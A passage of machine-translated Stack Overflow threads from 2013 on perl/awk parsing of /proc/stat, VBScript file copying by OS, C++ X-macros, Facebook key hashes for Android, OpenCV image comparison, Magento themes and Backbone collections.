cat /proc/stat | grep -E 'ctxt|intr|processes' | \
 perl -nle 'if ($line == /^intr (.*)/) {print $_} else {print $1}' 
```

问题出在最后一部分，else。我对 1 美元的价值不感兴趣，但我应该知道 1 美元中物品的总和。

$1 应该包含以下内容：

```
8522774 17 6 0 0 0 0 2 0 1 0 1435117 21 103 0 84742 65 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
```

但我不知道如何获得所有这些数字的总和。我相信我应该将它传递给 bc，但我不知道如何管理它。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T13:08:05.400

你的单行：

```
cat /proc/stat | grep -E 'ctxt|intr|processes' | \
perl -nle 'if ($line == /^intr (.*)/) {print $_} else {print $1}' 
```

这一行的问题是 perl 没有隐式变量`$line`，它被调用`$_`。此外，正则表达式适用于具有绑定运算符的字符串`=~`，而不是数字相等运算符`==`。您的 if 语句是相反的，如果正则表达式不匹配，您不想打印`$1`，因为那是您最后一个正则表达式中括号捕获的字符串。

您也不需要使用`cat`or `grep`，因为 perl 可以很好地处理这个问题。

```
perl -nlwe 'if (/ctxt|processes/) { print } 
            elsif (/^intr (.*)/ { print $1 }' /proc/stat 
```

这个单行*应该*完全按照您的行所做的，因为它“greps”匹配的行`ctxt|intr|processes`，并且只打印“intr”行的匹配。

如果你想打印某些数字的总和，这对我来说感觉像是一个全新的问题，你可以使用perl 模块中的`sum()`子例程。[`List::Util`](http://search.cpan.org/perldoc?List::Util)例如：

```
perl -MList::Util=sum -nlwe 'if (/ctxt|processes/) { print } 
            elsif (/^intr (.*)/ { print sum split ' ', $1 }' /proc/stat 
```

在这种情况下，您需要依靠捕获的字符串来仅包含数字。`sum()`接受一个数字列表，这就是我们需要拆分输入的原因。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:57:05.957

这个怎么样：

```
awk '/^intr/ {for(i=2;i<=NF;++i) sum+=$i; print "intr",sum}
     /^processes|ctxt/ {print}' /proc/stat 
```

您通常不必调用`bc`from `perl`，但您的整体方法可能是“流程越多越好”的原因。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2013-02-13T12:57:33.323

```
cat /proc/stat | grep -E 'ctxt|intr|processes' | 
    perl -nle 'if ($line == /^intr (.*)/) {print $_} else {print $1}' | 
    sed 's/ /+/g' | bc 
```

# windows - VBScript 基于操作系统和架构复制文件

> ID：14853979
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:49:17.283
> 
> 标签：windows, vbscript

我必须将 .cfg 文件复制到工作场所服务器上程序文件目录下的特定位置。

不幸的是，这不仅取决于操作系统（2003/2008/2012），而且还必须确定操作系统是 32 位还是 64 位，并在适用时复制到“程序文件（x86）”目录路径。

我的计划是在一台服务器上拥有文件的三个不同版本，并让脚本将相关版本复制到正确的位置（覆盖现有文件），但我对 vbscripting 的接触几乎为零，所以我挣扎大时代！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T13:29:56.507

WMI 可能是最好的方法。假设脚本将在每个目标主机上运行，​​您可以执行以下操作：

```
srcFolder = "..."

Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts://./root/cimv2")

For Each os In wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
  ver  = Left(os.Version, 3)
Next

Select Case ver
  Case "5.2" : src = fso.BuildPath(srcFolder, "w3003_foo.cfg")
  Case "6.0" : src = fso.BuildPath(srcFolder, "w2008_foo.cfg")
  Case "6.1" : src = fso.BuildPath(srcFolder, "w2008r2_foo.cfg")
  Case "6.2" : src = fso.BuildPath(srcFolder, "w2012_foo.cfg")
  Case Else  : WScript.Echo "Unsupported OS version: " & ver
               WScript.Quit
End Select

If sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
  dst = sh.ExpandEnvironmentStrings("%ProgramFiles(x86)%\some\foo.cfg")
Else
  dst = sh.ExpandEnvironmentStrings("%ProgramFiles%\some\foo.cfg")
End If

fso.CopyFile src, dst 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T05:27:19.100

您可以通过 WMI（或从注册表）获得的操作系统版本。

```
For Each os In GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
    ver = os.Version
Next 
```

但是对于操作系统架构，我会建议下一个 - WMI`Win32_Processor`或`Shell.Environment`（更多胖子）。

```
ver = GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth
If ver = 64 Then ...

ver = CreateObject("WScript.Shell").Environment("SYSTEM")("PROCESSOR_ARCHITECTURE")
If ver = "AMD64" Then ... 
```

# c++ - 通过宏定义 Enum/Struct 需要什么？

> ID：14853982
> 
> 赞同：7
> 
> 时间：2013-02-13T12:49:24.470
> 
> 标签：c++, c, macros, struct, enums

我指的是来自开源项目**tig**的代码示例。这是一个很棒的工具！

文件：tig.c

我正在努力寻找定义**请求**枚举的原因，如下所示：

```
enum request {
#define REQ_GROUP(help)
#define REQ_(req, help) REQ_##req

        /* Offset all requests to avoid conflicts with ncurses getch values. */
        REQ_UNKNOWN = KEY_MAX + 1,
        REQ_OFFSET,
        REQ_INFO,

        /* Internal requests. */
        REQ_JUMP_COMMIT,

#undef  REQ_GROUP
#undef  REQ_
}; 
```

甚至还有结构..

```
static const struct request_info req_info[] = {
#define REQ_GROUP(help) { 0, NULL, 0, (help) },
#define REQ_(req, help) { REQ_##req, (#req), STRING_SIZE(#req), (help) }
        REQ_INFO
#undef  REQ_GROUP
#undef  REQ_
}; 
```

可以看出`REQ_GROUP`已经#defined 多次造成混乱.. 至少对我来说。好吧，我知道这样做可能有充分的理由..使用宏在代码中隐藏枚举/结构定义的实际原因是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T13:02:02.967

当应该对同一数据源使用不同的处理时，这通常会下降。

例如，您可能会这样做：

```
#define MY_LIST X(Elem1) X(Elem2) X(Elem3) 
```

接着：

```
enum MyEnum {
# define X(e) e,

  MY_LIST

  Last

# undef X
}; 
```

在这种情况下，使用 的*当前*定义进行`MY_LIST`扩展。*`X`*

 *现在，在同一个文件中，我也可以使用`MY_LIST`创建一个`to_string`方法

```
char const* to_string(MyEnum e) {
    switch(e) {
#       define X(e) case e: return #e;

        MY_LIST

        case Last: return "Last";

#       undef X
    }
    return 0;
} // to_string 
```

这样，枚举值的集合只被写入一次，并且枚举和处理它的许多方法都会自动与这个集合保持同步。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:10:50.943

这是为了避免请求列表的重复。该列表只需要在一个地方维护， 的定义`REQ_INFO`， 枚举和数据结构是通过 和 的适当定义从该列表自动生成`REQ_GROUP`的`REQ_`。

如果没有这些宏，枚举和数据结构将不得不分开维护，注意保持它们彼此一致，涉及更多的工作和更大的错误范围。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T13:12:56.480

您错过了同一文件中的重要定义：

```
#define REQ_INFO \
REQ_GROUP("View switching") \
VIEW_INFO(VIEW_REQ), \
\
REQ_GROUP("View manipulation") \
REQ_(ENTER, "Enter current line and scroll"), \
REQ_(NEXT, "Move to next"), \
REQ_(PREVIOUS, "Move to previous"), \
< output omitted as it is too long > 
```

因此，例如，您显示的结构扩展为：

```
static const struct request_info req_info[] = {
   { 0, NULL, 0, "View switching" },
   < VIEW_INFO also expands to some long structure that was ommited here >
   { 0, NULL, 0, "View manipulation" },
   { REQ_ENTER, ENTER, STRING_SIZE("ENTER"), "Enter current line and scroll"},
   { REQ_NEXT, NEXT, STRING_SIZE("NEXT"), "Move to next"}
   < and so on >
}; 
```

正如提到的其他答案，它主要是为了保持多个结构/枚举器同步。*

# android - facebook错误配置错误

> ID：14853986
> 
> 赞同：-4
> 
> 时间：2013-02-13T12:49:43.607
> 
> 标签：android, facebook

> 第 2 步：创建一个新的签名 APK，传输到您的设备并安装。如果已经安装，自然会提示。
> 
> 第 3 步：在您的 DDMS (Logcat) 运行并且您的设备连接到计算机的情况下，运行应用程序并继续寻找密钥不匹配警告。该警告具有实际的哈希键。复制该密钥，转到您的 Facebook 开发人员页面并将新密钥添加到列表中。

我的 FB 仪表板中已经有哈希键。

我尝试了这些步骤，但我没有在 log cat 中获得任何密钥，这是简单的密钥不匹配。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:55:22.123

你读过 Facebook 开发者网站上的教程吗？

您需要签署您的应用程序。这样做的方法是在 Linux/Mac 上运行它

```
keytool -exportcert -alias androiddebugkey -keystore ~/.android/debug.keystore | openssl sha1 -binary | openssl base64 
```

或者在 Windows 上：

```
keytool -exportcert -alias androiddebugkey -keystore %HOMEPATH%\.android\debug.keystore | openssl sha1 -binary | openssl base64 
```

如[入门手册所示](https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/)

# android - Android中的OpenCV图像比较

> ID：14853989
> 
> 赞同：20
> 
> 时间：2013-02-13T12:49:57.210
> 
> 标签：android, opencv, feature-detection, surf, image-comparison

**[编辑]** 我设计了一些用于图像比较的代码。匹配的部分仍然有点缺陷，我希望得到一些帮助。该项目可以在 - [GitHub 上找到](http://github.com/torcellite/imageComparator)。

我有这两个图像**Img1**和**Img2**：

![在此处输入图像描述](../Images/dee882fb3180889f29beff8444c84433.png) ![在此处输入图像描述](../Images/7605c670668e92bdad26da601d54fd15.png)

当我在 openCV 中使用以下命令时

```
Mat img1 = Highgui.imread("mnt/sdcard/IMG-20121228.jpg");
Mat img2 = Highgui.imread("mnt/sdcard/IMG-20121228-1.jpg");

try{
    double l2_norm = Core.norm( img1, img2 );
    tv.setText(l2_norm+"");
} catch(Exception e) {
    //image is not a duplicate
} 
```

我得到 l2_norm 的双倍值。对于重复的图像对，此双精度值会有所不同。但如果图像不同，则会引发异常。这是我识别重复图像的方式吗？或者有没有更好的方法？我已经广泛搜索并找不到一个真正令人信服的答案。我想要关于如何比较两个图像并获得布尔值`true`或`false`取决于图像的代码和解释。

**编辑**

```
Scalar blah= Core.sumElems(img2);
    Scalar blah1=Core.sumElems(img1);

    if(blah.equals(blah1))
    {
        tv.setText("same image");
    }
    } 
```

我试过这个，但`if`条件永远不会满足。我假设有一些差异，但没有`compare`. `Scalar`我该怎么办？

**编辑**

```
try{
    Scalar blah= Core.sumElems(img2);
    Scalar blah1=Core.sumElems(img1);
    String b=blah.toString();
    String b1=blah1.toString();
    System.out.println(b+" "+b1);
    double comp=b.compareTo(b1);
    tv.setText(""+comp);
    } 
```

这种方法又是有缺陷的。虽然它可以用来比较准确度不错的图像，但当图像大小不同时它会失败。

当图像尺寸不同并且我打印标量值时，我得到了这个：

`[9768383.0, 1.0052889E7, 1.0381814E7, 0.0] [1.5897384E7, 1.6322252E7, 1.690251E7, 0.0]`

与比较相同尺寸的图像时相比，第二个和第三个数字之间的差异虽然不大，但还是相当大的。然而，第一个数字遭受的变化最大。

比较两个图像的内容的最佳最快方法是什么？

**[编辑]**

我正在使用我在[这里](https://stackoverflow.com/questions/10691521/surf-description-faster-with-fast-detection)找到的代码。

我无法弄清楚的是如何初始化`MatOfKeyPoint`变量`keypoints`和`logoKeypoints`. 这是我的代码片段：

```
 FeatureDetector detector = FeatureDetector.create(FeatureDetector.SURF);
        //FeatureDetector detector = FeatureDetector.create(FeatureDetector.FAST);
        //Imgproc.cvtColor(img1, img1, Imgproc.COLOR_RGBA2RGB);
        //Imgproc.cvtColor(img2, img2, Imgproc.COLOR_RGBA2RGB);

        DescriptorExtractor SurfExtractor = DescriptorExtractor
        .create(DescriptorExtractor.SURF);

        //extract keypoints
        MatOfKeyPoint keypoints, logoKeypoints;
        long time= System.currentTimeMillis();
        detector.detect(img1, keypoints);
        Log.d("LOG!", "number of query Keypoints= " + keypoints.size());
        detector.detect(img2, logoKeypoints);
        Log.d("LOG!", "number of logo Keypoints= " + logoKeypoints.size());
        Log.d("LOG!", "keypoint calculation time elapsed" + (System.currentTimeMillis() -time));

        //Descript keypoints
        long time2 = System.currentTimeMillis();
        Mat descriptors = new Mat();
        Mat logoDescriptors = new Mat();
        Log.d("LOG!", "logo type" + img2.type() + "  intype" + img1.type());
        SurfExtractor.compute(img1, keypoints, descriptors);
        SurfExtractor.compute(img2, logoKeypoints, logoDescriptors);
        Log.d("LOG!", "Description time elapsed" + (System.currentTimeMillis()- time2)); 
```

我显然无法初始化变量`keypoints`并`logoKeypoints`为空，因为那时我将收到一个空指针异常。如何初始化它们？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-02-16T10:37:51.903

你应该明白这不是一个简单的问题，你可以遵循不同的概念。我只会指出两个没有源代码的解决方案。

1.  **直方图比较**：您可以将两张图像转换为灰度，在 [0,...,255] 范围内制作直方图。每个像素值都将被计算在内。然后使用两个直方图进行比较。如果像素强度的分布等于或高于某个阈值（可能是所有像素的 90%），您可以将此图像视为重复图像。但是：这是最简单的解决方案之一，如果任何图片具有均等分布，则它是不稳定的。
2.  **Interest-Point-Detectors/-Descriptors**：看看 SIFT/SURF 图像检测器和描述符。检测器将尝试确定图像中强度的唯一关键点。将在此位置 I(x,y) 处计算描述符。具有蛮力方法和欧几里德距离的普通匹配器可以使用它们的描述符匹配这些图像。如果图像是重复的，则给定匹配的比率应该非常高。这个解决方案很好实施，并且可能有足够的关于这个主题的教程。

我希望这会有所帮助。请询问您是否有问题。

**[UPDATE-1]** C++ 教程： http://morf.lv/modules.php?name=tutorials&lasit=2#.UR- [ewKU3vCk](http://morf.lv/modules.php?name=tutorials&lasit=2#.UR-ewKU3vCk)

一些 JavaCV 教程：[http ://code.google.com/p/javacv/w/list](http://code.google.com/p/javacv/w/list)

**[UPDATE-2]** 这是一个使用默认参数的 SIFT-Detector 和 SIFT-Descriptor 示例。RANSAC 单应性阈值为 65，重投影误差（epsilon）为 10，启用交叉验证。您可以尝试计算匹配的。如果 Inliner-Outlier-Ratio 太高，您可能会将此对视为重复项。 ![使用 SIFT-detector 和 SIFT-descriptor 匹配 img1 和 img2](../Images/96a103fc24d7e87719cf67bf404c4274.png) 例如：这些图像在 IMG1 中产生 180 个关键点，在 IMG2 中产生 198 个关键点。匹配的描述符有 163 个，其中只有 3 个是异常值。所以这给出了一个非常好的比率，这仅意味着这些图像可能是重复的。

**[UPDATE-3]** 我不明白你为什么可以初始化 MatOfKeypoints。[我已经阅读了 API](http://docs.opencv.org/java/)，并且有一个公共构造函数。并且：您可以使用要分析的图像的垫子。这是非常好的。=)

```
MatOfKeyPoint reference = new MatOfKeyPoint(matOfReferenceImage); 
```

对于匹配，请使用[BRUTEFORCE_SL2 Descriptor-Matcher](http://docs.opencv.org/java/org/opencv/features2d/DescriptorMatcher.html)，因为您需要 SURF 或 SIFT 的欧几里得距离。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:09:19.173

用于`cv2.absDiff`计算图片之间的差异并`cv2.sumElems`获得所有像素差异的总和。

然后发明一个阈值来判断两个图像是否相似。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-21T14:04:25.947

您可以尝试以下代码：

```
Mat img1 = Highgui.imread("mnt/sdcard/IMG-20121228.jpg");
Mat img2 = Highgui.imread("mnt/sdcard/IMG-20121228-1.jpg");
Mat result = new Mat();

Core.compare(img1,img2,result,Core.CMP_NE);

int val = Core.countNonZero(result);

if(val == 0) {
    //Duplicate Image
} else {
    //Different Image
} 
```

在代码比较函数中，将比较两个图像，然后如果图像之间存在不相似性，则特定矩阵值将为 255，所有其他值将为零。然后您可以计算非零值的数量以确定图像是否相等。这仅适用于完全相同的图像。

如果您想比较忽略光效的图像，我建议您先生成边缘图像（使用 OpenCV 的 canny 函数），然后比较图像。

希望这个回答对你有帮助！！

# magento - 在 Magento 中，如何使用自定义主题文件夹而不是基本文件夹中的布局？

> ID：14853991
> 
> 赞同：0
> 
> 时间：2013-02-13T12:50:04.137
> 
> 标签：magento

我对 Magento 非常陌生，并且通过从头开始构建自定义主题来深入了解。

我已经添加了一个文件夹来`app/design/frontend`添加`skin/frontend`我的自定义主题并将所有资源添加到皮肤文件中。

然后我复制了布局文件夹`app/design/frontend/base` 并将其更改`page.xml`为：

```
<?xml version="1.0"?>

<layout version="0.1.0">

    <default translate="label" module="page">
        <label>All Pages</label>
        <block type="page/html" name="root" output="toHtml" template="page/default.phtml">

            <block type="page/html_head" name="head" as="head">
                <action method="addCss"><stylesheet>css/reset.css</stylesheet></action>
                <action method="addCss"><stylesheet>css/webfonts.css</stylesheet></action>
                <action method="addCss"><stylesheet>css/jqzoom.css</stylesheet></action>
                <action method="addCss"><stylesheet>css/core.css</stylesheet></action>
            </block>

            <block type="page/html_header" name="header" as="header">
                <block type="page/top_nav" name="top.nav" as="topNav"/>
                <block type="page/top_cart" name="top.cart" as="topCart"/>
            </block>
            <block type="page/html_nav" name="nav" as="nav" template="page/html/nav.phtml"/>

            <block type="page/html_aside" name="aside" as="aside" template="page/html/aside.phtml"/>

            <block type="core/text_list" name="content" as="content"/>

            <block type="page/html_newsletter" name="newsletter" as="newsletter" template="page/html/newsletter.phtml"/>
            <block type="page/html_features" name="features" as="features" template="page/html/features.phtml"/>

            <block type="page/html_footer" name="footer" as="footer" template="page/html/footer.phtml"/>

        </block>

    </default>

</layout> 
```

以适应我想要的布局，但是当我进入管理面板时，我在任何地方都找不到对我的布局的任何引用？

有什么想法可以将我的自定义主题文件夹中的布局放到自定义页面上吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T14:04:46.427

第 1 步：转到设计配置选项卡（系统 -> 配置 -> 设计选项卡）。

第 2 步：在 Design 选项卡中，在 Current package name 中，输入新主题所在界面的名称。如果此框留空，Magento 将自动加载名为“默认”的界面。

第 3 步：在默认（在主题标题下）中，输入您要加载到您的网站/商店的新主题的名称。如果您将此框留空，Magento 将仅自动加载名为“默认”的主题（请记住，无论您如何配置设计选项卡，Magento 都会自动加载名为“默认”的主题。如果您在管理员中分配主题，该主题将简单地在层次结构中加载更高，但将与主题“默认”一起加载。这将在即将发布的稳定版本中进行更改，以便您完全控制将哪些主题加载到商店中）。如果您选择根据文件类型（布局、模板、皮肤或翻译文件）单独加载主题，请输入从中获取相应文件类型的主题名称。

第 4 步：完成后，单击“保存配置”按钮并重新加载您的商店 - 瞧！您现在看到您的新主题反映在前端。

单击此处了解更多信息[http://www.magentocommerce.com/design_guide/articles/working-with-magento-themes](http://www.magentocommerce.com/design_guide/articles/working-with-magento-themes)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-19T11:33:04.283

**为 Magento CMS 页面添加新的页面布局**

Magento 提供先进的电子商务功能，但我们不应忽视经典的 CMS 页面，这些页面为您的网站提供额外的内容。通常这些页面很少包含具有相同结构的内容，因此我们需要为它们创建新模板。

要制作新模板，首先我们需要使用您的模板创建 phtml 文件并将其保存在 app/design/frontend/default/your-theme/template/page 然后打开 local.xml (app/etc/local.xml)。在第 55 行代码的某个地方，就在下面

```
<session_save><![CDATA[files]]></session_save> 
```

插入以下代码：将在管理面板页面/template-title.phtml 的下拉菜单中显示的标题

*   代码必须在标签内

示例：local.xml

![在此处输入图像描述](../Images/420f52740d1790b745a8df7439495ed8.png)

结果：管理面板中的 CMS 页面具有新布局。

![在此处输入图像描述](../Images/fd82b165082a444aafe0389f722f3083.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-19T13:21:33.527

首先为您的自定义主题创建适当的文件夹结构。

```
i.e. app/design/frontend/yourtheme/

(yourtheme =  give a name to your theme or it can be "default") 
```

然后在它们中创建一个布局文件夹，然后复制相应的文件以定义布局更改。

现在你应该有以下路径的文件

```
app/design/frontend/yourtheme/layout/page.xml 
```

然后转到管理面板中的**系统>配置>常规>设计>主题**

现在针对“默认”输入框设置主题名称（即您的主题）。

希望这可以帮助..

# backbone.js - collection.each() 不会迭代模型

> ID：14853997
> 
> 赞同：7
> 
> 时间：2013-02-13T12:50:28.690
> 
> 标签：backbone.js

我正在尝试迭代通过集合获取的模型。

我有以下代码：

```
initialize: function() {
                this.collection = new UserCollection();
                this.collection.fetch();
                this.render();
            },

            renderCollection: function() {
                console.log("rendering collection");
                this.collection.each(function(index,model){
                    console.log("model"); 
                });
                console.log(this.collection);
            },

render: function() {
                this.template = _.template(template, {});
                this.$el.html(this.template);
                // some other stuff
                this.renderCollection();
} 
```

和结果：

```
rendering collection

d {models: Array[0], length: 0, _byId: Object, constructor: function, model: function…}
_byId: Object
_idAttr: "id"
length: 4
models: Array[4]
0: d
_changing: false
_events: Object
_pending: false
_previousAttributes: Object
attributes: Object
created: "2013-02-13 09:22:42"
id: "1"
modified: "2013-02-13 09:22:42"
role: "admin"
username: "email@gmail.com"
__proto__: Object
changed: Object
cid: "c5"
collection: d
id: "1"
__proto__: e
1: d
2: d
3: d
length: 4
__proto__: Array[0]
__proto__: e
 user_list.js:25 
```

所以 fetch 方法确实有效 - 在对象转储中我可以找到 4 条记录，但迭代集合不起作用......

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-13T13:01:04.110

`each`在收集上做`model`自己作为一个`argument`.

尝试这个：

```
this.collection.each(function(model){
  console.log(model); 
}); 
```

它应该为您`model`提供当前迭代的。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-13T13:11:01.433

根据您提供的输出，看起来没有打印任何“模型”。这可能是由于在`.each()`执行块时`this.collection`可能尚未完全获取。这是由于 JavaScript 的异步特性。

在你的初始化方法中试试这个：

```
initialize: function() {
    var me = this;
    this.collection = new UserCollection();
    // Listen to 'reset' events from collection, so when .fetch() is completed and all
    // ready to go, it'll trigger .render() automatically.
    this.listenTo(this.collection, 'reset', this.render);
    this.collection.fetch();
}, 
```

处理此问题的另一种方法是在 fetch 上添加成功处理程序，但我认为在这种情况下监听重置事件就足够了。

希望这可以帮助！

顺便说一句，就像 Cyclone 所说，.each 的处理程序应该只是一个没有索引的模型。:)